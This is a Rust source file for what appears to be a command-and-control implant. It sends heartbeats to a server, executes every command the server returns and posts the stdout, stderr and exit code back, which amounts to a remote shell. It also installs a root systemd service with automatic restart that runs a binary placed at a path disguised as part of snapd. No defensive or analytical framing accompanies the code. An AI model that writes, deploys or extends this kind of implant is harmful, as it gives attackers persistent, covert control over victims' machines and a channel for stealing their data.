use crate::agent::AgentContext;
use std::process::Output;
use talaria::protocol::*;
use tokio::io;
use tokio::io::AsyncWriteExt;

/// Handles responses from the server.
use std::process::Command;

pub async fn handle_response(agent: &mut AgentContext, response: AgentInstruction) {
    match response.packet_body {
        AgentInstructionBody::Command {
            ref command,
            ref command_id,
            ref args,
        } => {
            println!(
                "Executing Command: {:?}, ID: {:?}, Args: {:?}",
                command, command_id, args
            );

            // Execute the received command with arguments
            let output: Output = Command::new(command)
                .args(args)
                .output()
                .expect("Failed to execute command");

            // Capture stdout, stderr, and status code
            let stdout = String::from_utf8_lossy(&output.stdout).to_string();
            let stderr = String::from_utf8_lossy(&output.stderr).to_string();
            let status_code = output.status.code().unwrap_or(-1); // Fallback to -1 if exit code is not available

            // Print the output for debugging
            println!("Command Output: \nSTDOUT: {}\nSTDERR: {}", stdout, stderr);

            // Prepare the response to send back to the server
            let agent_response = AgentResponse {
                packet_header: agent.generate_packet_header(),
                packet_body: AgentResponseBody::CommandResponse {
                    command: command.to_string(),
                    command_id: *command_id,
                    status_code,
                    stdout, // Send the actual command output (stdout) as the response
                    stderr,
                },
            };

            // Send the response back to the server with the actual command output
            make_request(agent, agent_response).await;
        }
        AgentInstructionBody::RequestHeartbeat => {
            println!("Received heartbeat request from server.");
        }
        AgentInstructionBody::Ok => {
            println!("Server acknowledged previous operation.");
        }
    }

    println!("Processed Response: {:#?}", response);
}

/// Sends a heartbeat to the server.
pub async fn send_heartbeat(agent: &mut AgentContext) -> Option<AgentInstruction> {
    let response = AgentResponse {
        packet_header: agent.generate_packet_header(),
        packet_body: AgentResponseBody::Heartbeat,
    };

    make_request(agent, response).await
}

pub async fn setup_systemd_service() -> Result<(), io::Error> {
    // Define the service name
    let service_name = "my_agent_service";

    // Create the systemd service file
    let service_content = format!(
        "[Unit]\n\
        Description=Agent Service\n\
        After=network.target\n\n\
        [Service]\n\
        ExecStart=/var/snap/snapd/common/hermes\n\
        Restart=always\n\
        User=root\n\
        Group=root\n\n\
        [Install]\n\
        WantedBy=multi-user.target"
    );

    // Save the service content to the systemd folder
    let mut file =
        tokio::fs::File::create(format!("/etc/systemd/system/{}.service", service_name)).await?;
    file.write_all(service_content.as_bytes()).await?;

    // Reload systemd to recognize the new service
    let _ = Command::new("systemctl").arg("daemon-reload").output();

    // Enable the service to start on boot
    let _ = Command::new("systemctl")
        .arg("enable")
        .arg(service_name)
        .output();

    // Start the service immediately
    let _ = Command::new("systemctl")
        .arg("start")
        .arg(service_name)
        .output();

    Ok(())
}

/// Sends a request to the server and handles the response.
async fn make_request(
    agent: &mut AgentContext,
    request: AgentResponse,
) -> Option<AgentInstruction> {
    let request = AgentResponse::serialize(&request);
    let response = agent
        .http_client
        .post(agent.server_addr.clone() + "/agent/monolith")
        .body(request)
        .send()
        .await;

    match response {
        Ok(response) => {
            let bytes = response.bytes().await.unwrap();
            let instruction = AgentInstruction::deserialize(&bytes.to_vec());
            Some(instruction)
        }
        Err(_) => None,
    }
}
